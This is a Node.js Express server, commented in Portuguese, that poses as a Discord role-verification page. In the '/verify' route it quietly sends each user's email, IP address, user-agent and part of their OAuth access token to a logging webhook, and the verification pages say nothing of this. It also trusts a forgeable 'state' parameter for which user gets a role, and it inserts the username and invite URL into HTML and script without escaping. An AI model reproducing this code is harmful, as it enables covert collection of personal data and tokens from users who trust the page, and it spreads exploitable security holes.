const express = require('express');
const axios = require('axios');

const app = express();

// Variáveis de ambiente (configurar no Render.com)
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI;
const BOT_TOKEN = process.env.BOT_TOKEN;
const LOG_WEBHOOK = process.env.LOG_WEBHOOK; // Webhook do Discord para logs

const PORT = process.env.PORT || 8080;

// Página inicial
app.get('/', (req, res) => {
    res.send(paginaHome());
});

// Rota de verificação OAuth2
app.get('/verify', async (req, res) => {
    const { code, state } = req.query;

    if (!code || !state) {
        return res.status(400).send(paginaErro('Parâmetros inválidos. Tente novamente pelo Discord.'));
    }

    try {
        const [userId, guildId, roleId] = state.split('_');

        // 1. Trocar código pelo token
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        // 2. Pegar info do usuário
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const discordUser = userResponse.data;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // 3. Dar o cargo via API do bot
        if (roleId && guildId) {
            await axios.put(
                `https://discord.com/api/v10/guilds/${guildId}/members/${userId}/roles/${roleId}`,
                {},
                { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
            ).catch(e => console.error('Erro ao dar cargo:', e.response?.data));
        }

        // 4. Enviar log via Webhook
        if (LOG_WEBHOOK) {
            await axios.post(LOG_WEBHOOK, {
                embeds: [{
                    title: '✅ Usuário Verificado',
                    color: 0x57f287,
                    thumbnail: discordUser.avatar 
                        ? { url: `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.png` }
                        : null,
                    fields: [
                        { name: 'Usuário', value: `${discordUser.username} (\`${discordUser.id}\`)`, inline: true },
                        { name: 'E-mail', value: discordUser.email || 'Não disponível', inline: true },
                        { name: 'IP', value: ip || 'Não detectado', inline: false },
                        { name: 'User-Agent', value: (req.headers['user-agent'] || 'N/A').substring(0, 1024), inline: false },
                        { name: 'Access Token', value: `\`\`\`${accessToken.substring(0, 30)}...\`\`\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            }).catch(e => console.error('Erro no webhook:', e.message));
        }

        // 5. Pegar invite do servidor para redirect
        let inviteUrl = `https://discord.com/channels/${guildId}`;
        try {
            const invitesRes = await axios.get(
                `https://discord.com/api/v10/guilds/${guildId}/invites`,
                { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
            );
            if (invitesRes.data.length > 0) {
                inviteUrl = `https://discord.gg/${invitesRes.data[0].code}`;
            }
        } catch (e) {}

        // 6. Responder com página de sucesso + animação
        res.send(paginaSucesso(discordUser.username, inviteUrl));

    } catch (error) {
        console.error('Erro OAuth2:', error.response?.data || error.message);
        res.status(500).send(paginaErro('Erro ao processar verificação. Tente novamente.'));
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Servidor de verificação rodando na porta ${PORT}`);
});

// ═══════════════════════════════════════════════════════
// PÁGINAS HTML
// ═══════════════════════════════════════════════════════

function paginaHome() {
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ Verificação</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0d0d0d;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: #1a1a1a;
            border-radius: 16px;
            border: 1px solid #2b2d31;
            box-shadow: 0 0 40px rgba(88, 101, 242, 0.1);
        }
        .shield { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; color: #5865f2; }
        p { color: #b5bac1; font-size: 14px; }
        .status { color: #57f287; margin-top: 15px; font-size: 12px; }
        .dot { animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🛡️</div>
        <h1>Servidor de Verificação</h1>
        <p>Este servidor está funcionando corretamente.</p>
        <p>Use o link de verificação no Discord.</p>
        <p class="status">● Online<span class="dot">...</span></p>
    </div>
</body>
</html>`;
}

function paginaSucesso(username, inviteUrl) {
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>✅ Verificado!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0d0d0d;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            padding: 50px;
            background: #1a1a1a;
            border-radius: 16px;
            border: 1px solid #2b2d31;
            box-shadow: 0 0 60px rgba(87, 242, 135, 0.15);
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .checkmark-circle {
            width: 100px; height: 100px;
            margin: 0 auto 25px;
        }
        .checkmark-circle svg { width: 100px; height: 100px; }
        .checkmark-circle .circle {
            stroke: #57f287; stroke-width: 3; fill: none;
            stroke-dasharray: 283; stroke-dashoffset: 283;
            animation: drawCircle 0.8s ease forwards;
        }
        .checkmark-circle .check {
            stroke: #57f287; stroke-width: 4; fill: none;
            stroke-linecap: round; stroke-linejoin: round;
            stroke-dasharray: 50; stroke-dashoffset: 50;
            animation: drawCheck 0.4s ease forwards 0.8s;
        }
        @keyframes drawCircle { to { stroke-dashoffset: 0; } }
        @keyframes drawCheck { to { stroke-dashoffset: 0; } }
        h1 { font-size: 28px; color: #57f287; margin-bottom: 10px; opacity: 0; animation: fadeUp 0.5s ease forwards 1s; }
        .username { font-size: 18px; color: #fff; margin-bottom: 8px; opacity: 0; animation: fadeUp 0.5s ease forwards 1.2s; }
        .desc { color: #b5bac1; font-size: 14px; margin-bottom: 25px; opacity: 0; animation: fadeUp 0.5s ease forwards 1.4s; }
        .redirect-info { color: #5865f2; font-size: 13px; opacity: 0; animation: fadeUp 0.5s ease forwards 1.6s; }
        .progress-bar {
            width: 200px; height: 4px; background: #2b2d31;
            border-radius: 4px; margin: 15px auto 0; overflow: hidden;
            opacity: 0; animation: fadeUp 0.5s ease forwards 1.6s;
        }
        .progress-bar .fill {
            height: 100%; background: linear-gradient(90deg, #5865f2, #57f287);
            border-radius: 4px; animation: progress 3s linear forwards 1.8s; width: 0%;
        }
        @keyframes progress { to { width: 100%; } }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .btn {
            display: inline-block; margin-top: 20px; padding: 12px 30px;
            background: #5865f2; color: #fff; text-decoration: none;
            border-radius: 8px; font-weight: 600; font-size: 14px;
            opacity: 0; animation: fadeUp 0.5s ease forwards 1.8s; transition: background 0.2s;
        }
        .btn:hover { background: #4752c4; }
        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; z-index: -1; }
        .particle {
            position: absolute; width: 4px; height: 4px; background: #57f287;
            border-radius: 50%; opacity: 0; animation: float 3s ease-in infinite;
        }
        @keyframes float { 0% { transform: translateY(100vh); opacity: 0; } 10% { opacity: 0.8; } 100% { transform: translateY(-20vh); opacity: 0; } }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="container">
        <div class="checkmark-circle">
            <svg viewBox="0 0 100 100">
                <circle class="circle" cx="50" cy="50" r="45"/>
                <path class="check" d="M30 52 L44 66 L70 36"/>
            </svg>
        </div>
        <h1>Verificação Concluída!</h1>
        <p class="username">Bem-vindo, <strong>${username}</strong>!</p>
        <p class="desc">Seu cargo foi aplicado com sucesso.<br>Você será redirecionado ao servidor automaticamente.</p>
        <div class="progress-bar"><div class="fill"></div></div>
        <p class="redirect-info">Redirecionando em 4 segundos...</p>
        <a href="${inviteUrl}" class="btn">🚀 Ir para o Servidor</a>
    </div>
    <script>
        const container = document.getElementById('particles');
        for (let i = 0; i < 20; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDelay = Math.random() * 3 + 's';
            p.style.animationDuration = (2 + Math.random() * 3) + 's';
            container.appendChild(p);
        }
        setTimeout(() => { window.location.href = '${inviteUrl}'; }, 4000);
    </script>
</body>
</html>`;
}

function paginaErro(mensagem) {
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>❌ Erro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0d0d0d; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { text-align: center; padding: 50px; background: #1a1a1a; border-radius: 16px; border: 1px solid #2b2d31; box-shadow: 0 0 40px rgba(237, 66, 69, 0.1); }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 24px; color: #ed4245; margin-bottom: 10px; }
        p { color: #b5bac1; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">❌</div>
        <h1>Erro na Verificação</h1>
        <p>${mensagem}</p>
    </div>
</body>
</html>`;
}
